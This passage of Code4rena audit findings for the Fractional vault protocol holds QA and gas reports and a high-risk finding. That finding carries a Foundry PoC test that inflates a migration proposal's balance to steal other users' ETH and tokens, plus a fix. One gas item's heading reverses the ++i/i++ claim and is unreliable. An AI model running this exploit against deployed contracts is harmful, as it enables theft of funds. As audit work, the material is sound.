all these premises, I consider that the `nonReentrant` modifier is needed in the following methods:  - [Buyout.sol#L168-L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L168-L176) - [Buyout.sol#L226-L235](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L226-L235) - [Buyout.sol#L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L221) - [Buyout.sol#L264-L270](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L264-L270) - [Migration.sol#L164-L172](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L164-L172) - [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L279) - [Migration.sol#L312-L325](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L312-L325)  ## **6. Lock ether**  If someone sends ether to the `Buyout` contract without using the buy/sell methods, via the `receive` method, they will be blocked forever. A similar behavior occurs in the `Migration` contract.  Affected source code:  - [Buyout.sol#L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53) - [Migration.sol#L63](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L63)  ## **7. Complex `fallback`**  The fallback method iss too complex and can be denied in certain cases.  According to the `fallback` solidity (documentation](https://docs.soliditylang.org/en/develop/contracts.html#fallback-function)  > In the worst case, if a payable fallback function is also used in place of a receive function, it can only rely on 2300 gas being available (see [receive Ether function](https://docs.soliditylang.org/en/develop/contracts.html#receive-ether-function) for a brief description of the implications of this).  > In the worst case, the receive function can only rely on 2300 gas being available (for example when send or transfer is used), leaving little room to perform other operations except basic logging. The following operations will consume more gas than the 2300 gas stipend: > - Writing to storage > - Creating a contract > - Calling an external function which consumes a large amount of gas > - Sending Ether  Reference:  - https://docs.soliditylang.org/en/develop/contracts.html#fallback-function  Affected source code:  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ----  # Non-Critical  ## **8. Outdated packages**  Some used packages are out of date, it is good practice to use the latest version of these packages:  `\"@openzeppelin/contracts\": \"^4.6.0\"`   last `4.7.0`  ## **9. Lack of checks**  Check for `address(0)` during `constructor`, otherwise it could lead to bad initialization, bad implementations, or bad admin changes.  Affected source code for `address(0)`:  - [Supply.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L17) - [Metadata.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L17) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18) - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Buyout.sol#L47-L49](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L47-L49) - [Migration.sol#L58-L59](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L58-L59)  Royalty `_percentage` must be less than 100, otherwise it could result in a Denial of Service in [royaltyInfo](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L247): - [FERC1155.sol#L223](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L223)  ## **10. Open TODO**  The code that contains \"open todos\" reflects that the development is not finished and that the code can change a posteriori, prior release, with or without audit.  Affected source code:  - [MerkleBase.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L24)  ## **11. Use `abstract` for base contracts**  Abstract contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  Reference:  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  Affected source code:  - [Minter.sol#L12](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L12)  ## **12. `install` allows `uninstall`**  It is possible to use the method `install` for `uninstall`, and the emmited event will be different. Being able to affect the correct functioning of the dApps that consume it. You only need to specify an `address(0)` as plugin during `install`.  Affected source code:  - [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73)  ## **13. Contracts with functions without auth that can produce economic losses**  The `BaseVault`, `Transfer` or `TransferReference` contracts allows an attacker to steal all the tokens to the implementation it has without having any type of auth, although it is not expected to have tokens, and trying to call with a delegate call is a risk that must be known.  ```javascript function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external {    IERC20(_token).transfer(_to, _value); } ```  Affected source code:  - [Transfer.sol#L13](https://github.com/code-423n4/2022-07-fractional/blob/main/src/targets/Transfer.sol#L13) - [TransferReference.sol#L17-L69](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L17-L69) - [BaseVault.sol#L53-L117](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L53-L117)  The same thing happens in the `Supply` contract with `mint` and `burn`:  ```javascript /// @notice Mints fractional tokens /// @param _to Target address /// @param _value Transfer amount function mint(address _to, uint256 _value) external {     IVaultRegistry(registry).mint(_to, _value); }  /// @notice Burns fractional tokens /// @param _from Source address /// @param _value Burn amount function burn(address _from, uint256 _value) external {     IVaultRegistry(registry).burn(_from, _value); } ```  Affected source code:  - [Supply.sol#L11](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L11) - [SupplyReference.sol#L22-L31](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L22-L31)  ## **14. Improve `propose` method design**  The `propose` method of `Migration` contract should return the `proposalId` in order to avoid human errors like the one mentioned in the *\"User may lose ether due to incorrect `proposalId`*.  Affected source code:  - [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "- [Gas](#gas)     - [**1. constants expressions are expressions, not constants**](#1-constants-expressions-are-expressions-not-constants)     - [**2. Reorder structure layout**](#2-reorder-structure-layout)     - [**3. Use calldata instead of memory**](#3-use-calldata-instead-of-memory)     - [**4. There's no need to set default values for variables**](#4-theres-no-need-to-set-default-values-for-variables)     - [**5. Don't use the length of an array for loops condition**](#5-dont-use-the-length-of-an-array-for-loops-condition)     - [**6. ++i costs less gas compared to i++ or i += 1**](#6-i-costs-less-gas-compared-to-i-or-i--1)     - [**7. Reduce the size of error messages Long revert Strings**](#7-reduce-the-size-of-error-messages-long-revert-strings)         - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)     - [**8. Use library instead of abstract contract**](#8-use-library-instead-of-abstract-contract)     - [**9. Use inline methods**](#9-use-inline-methods)     - [**10. Gas saving using immutable**](#10-gas-saving-using-immutable)     - [**11. Improved migrateFractions logic**](#11-improved-migratefractions-logic)  -----  # Gas  ## **1. `constants` expressions are expressions, not `constants`**  Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was immutable instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  Reference:  - https://github.com/ethereum/solidity/issues/9232  Consequences: each usage of a \"constant\" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..). since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )  Affected source code:  - [Permit.sol#L5-L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Permit.sol#L5-L17)  ## **2. Reorder structure layout**  The following structs could be optimized moving the position of certains values in order to save slot storages:  Put booleans types together on [IMigration.sol#L8-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L8-L33)  ```diff struct Proposal {     // Start time of the migration proposal     uint256 startTime;     // Target buyout price for the migration     uint256 targetPrice;     // Total ether contributed to the migration     uint256 totalEth;     // Total fractions contributed to the migration     uint256 totalFractions;     // Module contract addresses proposed for the migration     address[] modules;     // Plugin contract addresses proposed for the migration     address[] plugins;     // Function selectors for the proposed plugins     bytes4[] selectors; +   // Old fraction supply for a given vault +   uint256 oldFractionSupply; +   // New fraction supply for a given vault that has succesfully migrated +   uint256 newFractionSupply;     // Address for the new vault to migrate to (if buyout is succesful)     address newVault;     // Boolean status to check if the propoal is active     bool isCommited; -   // Old fraction supply for a given vault -   uint256 oldFractionSupply; -   // New fraction supply for a given vault that has succesfully migrated -   uint256 newFractionSupply;     // Boolean status to check that the fractions have already been migrated     bool fractionsMigrated; } ```  ## **3. Use `calldata` instead of `memory`**  The following methods are `external` but `memory` is used for arguments.  - [IMigration.sol#L89-L162](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L89-L162) - [IModule.sol#L8-L13](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IModule.sol#L8-L13) - [IVault.sol#L43-L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L43-L64) - [IVaultRegistry.sol#L43-L71](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVaultRegistry.sol#L43-L71)   These one require to change the visibility to `external`:  - [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) - [MerkleBase.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73)  ## **4. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **5. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [MerkleBase.sol#L110](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [BaseVault.sol#L130-L132](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130-L132) - [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454)  ## **6. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  Affected source code:  - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **7. Reduce the size of error messages (Long revert Strings)**  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ### Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert(\"Insufficient funds.\");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) - [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)  ## **8. Use `library` instead of `abstract` contract**  If the following contracts were libraries, they could save gas thanks to compiler optimizations since there are functions that are not called and being an abstract contract implies publishing all the code marked as public, such as library, the compiler can choose which functions to eliminate by not be used.  Smaller contracts would be produced, with less inheritance and therefore more auditable and readable.  Affected source code:  - [MerkleBase.sol](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L7)  ## **9. Use inline methods**  The following methods can be moved to inline calls without greatly affecting readability, this will increase the performance of the contract.  Affected source code:  - [Multicall.sol#L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Multicall.sol#L39)  ## **10. Gas saving using `immutable`**  It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:  It's also better to remove the initial values, because they will be set during the constructor.  Affected source code:  - [BaseVault.sol#L19](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L19) - [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - [VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39)  ## **11. Improved `migrateFractions` logic**  [migrateFractions](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438-L449) method could be optimized as follows:  ```diff -       (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo( +       (, address proposer, State current, , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(             _vault         );         State required = State.SUCCESS;         if (current != required) revert IBuyout.InvalidState(required, current);         // Reverts if proposer of buyout is not this contract         if (proposer != address(this)) revert NotProposalBuyout(); - -       // Gets the last total supply of fractions for the vault -       (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( -           _vault -       ); ```  **There is no need to duplicate the call of `buyoutInfo(_vault)`** "}, {"title": "Steal NFTs from a Vault, and ETH + Fractional tokens from users.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/27", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L292   # Vulnerability details  ## Impact Steal NFTs from a Vault, and ETH + Fractional tokens from users.  ## Description  The `Migration.sol` module expects users to join a proposal using the `join` function, and leave a proposal using the `leave` function, both functions update fraction and ether balances of the proposal *and* the caller.  The `withdrawContribution` function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.  Unfortunately, the `withdrawContribution` function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables `totalEth` and `totalFractions` (as `join` and `leave` do), leading to an inflation of ETH and fractional tokens if the user calls `join`, `withdrawContribution` and `join` again.  Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:  1- Lack of funds (they were stolen).  2- Only 1 LIVE proposal can be running at the same time.  A key element to take note is that only 1 proposal can be `LIVE`, but before a proposal goes `LIVE`, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.  ## Steps to reproduce An attacker's will exploit the inflation bug as follow:  1- Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.  2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.  3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and `start` it.  Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.  **NOTE: In the `REJECTION_PERIOD` victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the `depositAmount` and `msg.value` (https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker. **   ## Proof of Concept The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproduce PoC that illustrates the impact of the attack.  Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.  You can read the PoC or include the function in `test/Migration.t.sol` and call `forge test -vvv --match-test testProposalAttack` to execute it.   ```     function testProposalAttack() public {         initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);         (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();         address[] memory modules = new address[](1);         modules[0] = address(mockModule);          // STEP 0         // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made          // STEP 1         // Alice makes a legit proposal         alice.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY * 2,             1 ether         );          // STEP 3         // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000         alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);          // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,         // but to make this PoC easier to read, instead of creating several fake accounts,         // let's have just Alice join his own proposal with 50% of token supply.          // STEP 4         // Bob makes an evil proposal, with evil modules to steal the vault's NFTs         bob.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY,             1 ether         );          // STEP 5         // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal         // and total locked tokens (thanks to a bug in the `withdrawContribution` function)         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 24);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 101);           // Let's do some accounting...         (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);         (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);          // Alice proposal has 50 ETH.         assertEq(totalEth_AliceProposal, 50000000000000000000);          // Bob's proposal has 50 ETH.         assertEq(totalEth_BobProposal, 50000000000000000000);          // He only put 10 ETH, but it shows 50 ETH because         // we inflate it by exploiting the bug.          // We can keep inflating it indefinitely to get any ETH         // amount desired (up to the max ETH balance of the smart contract).          // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.          // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.          // STEP 6         // Bob calls commit to kickoff the buyout process         bool started = bob.migrationModule.commit(vault, 2);         assertTrue(started);          // Final accounting:         // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,         // exactly what is required to win a proposal)         assertEq(getFractionBalance(buyout), 5101);          // and 50 ETH from Alice's proposal         assertEq(getETHBalance(buyout), 50 ether);          // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether         assertEq(getETHBalance(bob.addr), 90 ether);          // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen         // from Alice's proposal         assertEq(getFractionBalance(bob.addr), 4899);          // Next steps are straight forward, you can get creative and do many things that would make the PoC         // unnecessarily long          // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE         // at the same time. Also, there's not enough ETH in the contract to commit his proposal,         // We are using all of his ETH in our own proposal.  ```  ## Tools Used Run `forge test -vvv --match-test testProposalAttack` after preparing the testing environment as explained in https://github.com/code-423n4/2022-07-fractional#prepare-environment   ## Recommended Mitigation Steps Update the `proposal.totalEth` and `proposal.totalFractions` in the `withdrawContribution` function.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "#  [G-01] State variables only set in the constructor should be declared `immutable`:-        1. File: j2022-07-fractional/src/Vault.sol (line 12-17):            `    /// @notice Address of vault owner     address public owner;     /// @notice Merkle root hash of vault permissions     bytes32 public merkleRoot;     /// @notice Initializer value     uint256 public nonce;`        2. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 29-33):            `    address public registry;     /// @notice Address of Supply target contract     address public supply;     /// @notice Address of Transfer target contract     address public transfer;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 36-41):            `    /// @notice Address of Buyout module contract     address payable public buyout;     /// @notice Address of VaultRegistry contract     address public registry;     /// @notice Counter used to assign IDs to new proposals     uint256 public nextId;`                  5. File: 2022-07-fractional/src/modules/Minter.sol (line 14):            `address public supply;`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 19):            `address public registry;`        7. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`               #  [G-02] `x = x + y` is cheaper than `x += y`:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 62):            `totalSupply[_id] -= _amount;`        2. File: 2022-07-fractional/src/FERC1155.sol (line 270):            `balanceOf[_from][_id] -= _amount;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 139):            `buyoutInfo[_vault].ethBalance -= ethAmount;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 156):            `proposal.totalFractions -= amount;`                  5. File: 2022-07-fractional/src/modules/Migration.sol (line 160):            `proposal.totalEth -= ethAmount;`         6. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 190):            `ceil -= pOf2;`        7. File: 2022-07-fractional/src/FERC1155.sol (line 86):            `totalSupply[_id] += _amount;`         8. File: 2022-07-fractional/src/FERC1155.sol (line 271):            `balanceOf[_to][_id] += _amount;`        9. File: 2022-07-fractional/src/modules/Buyout.sol (line 176):            `buyoutInfo[_vault].ethBalance += msg.value;`                  10. File: 2022-07-fractional/src/modules/Migration.sol (line 123-124):            `proposal.totalEth += msg.value;         userProposalEth[_proposalId][msg.sender] += msg.value;`        11. File: 2022-07-fractional/src/modules/Migration.sol (line 134-135):            `proposal.totalFractions += _amount;         userProposalFractions[_proposalId][msg.sender] += _amount;`                  12. File: 2022-07-fractional/src/modules/Migration.sol (line 497):            `treeLength += IModule(_modules[i]).getLeafNodes().length;`         13. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 147):            `for (uint256 i; i < length - 1; i += 2) {`     #  [G-03] <array>.length should not be looked up in every loop of a for-loop:-        1. File: 2022-07-fractional/src/modules/Buyout.sol (line 454):            `for (uint256 i; i < permissions.length; ) {`        2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        4. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  5. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        7. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         8. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`              #  [G-04] `i++` costs less gas than `++i`, especially when it\u2019s used in for-loops (i--/--i too):-         1. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`               #  [G-05] Using `private` rather than `public` for constants, saves gas (If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 15-17):            ` string public constant NAME = \"FERC1155\";     /// @notice Version number of the token contract     string public constant VERSION = \"1\";`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 35-37):            `    uint256 public constant PROPOSAL_PERIOD = 2 days;     /// @notice Time length of the rejection period     uint256 public constant REJECTION_PERIOD = 4 days;`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 43):            `uint256 public constant PROPOSAL_PERIOD = 7 days;`        4. File: 2022-07-fractional/src/utils/SafeSend.sol (line 11-12):            `address payable public constant WETH_ADDRESS =         payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);`                                  #  [G-06] `require()/revert()` strings longer than 32 bytes cost extra gas:-        1. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, \"wont generate proof for single leaf\");`     #  [G-07] It costs more gas to initialize variables to zero than to let the default of zero be applied:-         1. File: 